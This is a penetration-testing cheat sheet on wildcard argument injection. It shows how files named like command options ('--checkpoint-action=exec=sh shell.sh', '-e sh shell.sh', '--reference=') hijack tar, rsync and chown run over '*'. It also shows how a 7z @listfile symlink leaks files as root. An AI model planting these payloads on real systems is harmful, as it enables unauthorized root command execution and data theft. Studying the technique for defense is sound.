# Wildcards Spare tricks

### chown, chmod

You can **indicate which file owner and permissions you want to copy for the rest of the files**

```bash
touch "--reference=/my/own/path/filename"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _\(combined attack\)_  
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

### Tar

**Execute arbitrary commands:**

```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _\(tar attack\)_  
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

### Rsync

**Execute arbitrary commands:**

```bash
Interesting rsync option from manual:

 -e, --rsh=COMMAND           specify the remote shell to use
     --rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _\(_rsync _attack\)_  
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

### 7z

In **7z** even using `--` before `*` \(note that `--` means that the following input cannot treated as parameters, so just file paths in this case\) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:

```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```

And you can create files in the folder were this is being executed, you could create the file `@root.txt` and the file `root.txt` being a **symlink** to the file you want to read:

```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```

Then, when **7z** is execute, it will treat `root.txt` as a file containing the list of files it should compress \(thats what the existence of `@root.txt` indicates\) and when it 7z read `root.txt` it will read `/file/you/want/to/read` and **as the content of this file isn't a list of files, it will throw and error** showing the content.

_More info in Write-ups of the box CTF from HackTheBox._ 

\_\_

